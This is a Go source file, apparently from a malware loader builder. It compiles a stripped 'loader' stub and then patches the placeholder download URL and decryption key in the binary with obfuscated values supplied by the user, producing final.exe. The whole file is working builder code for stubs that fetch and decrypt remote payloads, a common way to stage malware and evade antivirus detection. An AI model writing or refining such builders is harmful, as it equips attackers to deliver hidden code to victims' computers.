package utils

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os/exec"
)

/**
 * @Author Lockly
 * @Description
 * @Date 2023/9/24
 **/

func G(u string, k []byte) {
	var stderr bytes.Buffer

	cmd := exec.Command("cmd.exe", "/c", "start", "go", "build", "-ldflags", "-s -w", "main.go")
	cmd.Stderr = &stderr
	cmd.Dir = "loader"
	if err := cmd.Run(); err != nil {
		fmt.Println(stderr.String())
		return
	}
	fmt.Println("[+] stub初始化完成！")

	fh := X([]byte("http://255.255.255.255/65535/abcdefghijklmnopqrstuvwxyz.txt"))
	fk := X([]byte("1234567890abcdefghijklmnopqrstuvwxyz"))
	dh := X([]byte(u))
	dk := X(k)

	stubData, err := ioutil.ReadFile("./loader/main.exe")
	if err != nil {
		log.Fatal(err)
	}
	stubData = Rb(stubData, fh, dh)
	stubData = Rb(stubData, fk, dk)
	err = ioutil.WriteFile("./output/final.exe", stubData, 0777)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] 关键值替换完成！")
}

func Rb(data, sBytes, dBytes []byte) []byte {
	dBytesArr := make([]byte, len(sBytes))
	copy(dBytesArr, dBytes)
	data = bytes.Replace(data, sBytes, dBytesArr, -1)
	return data
}
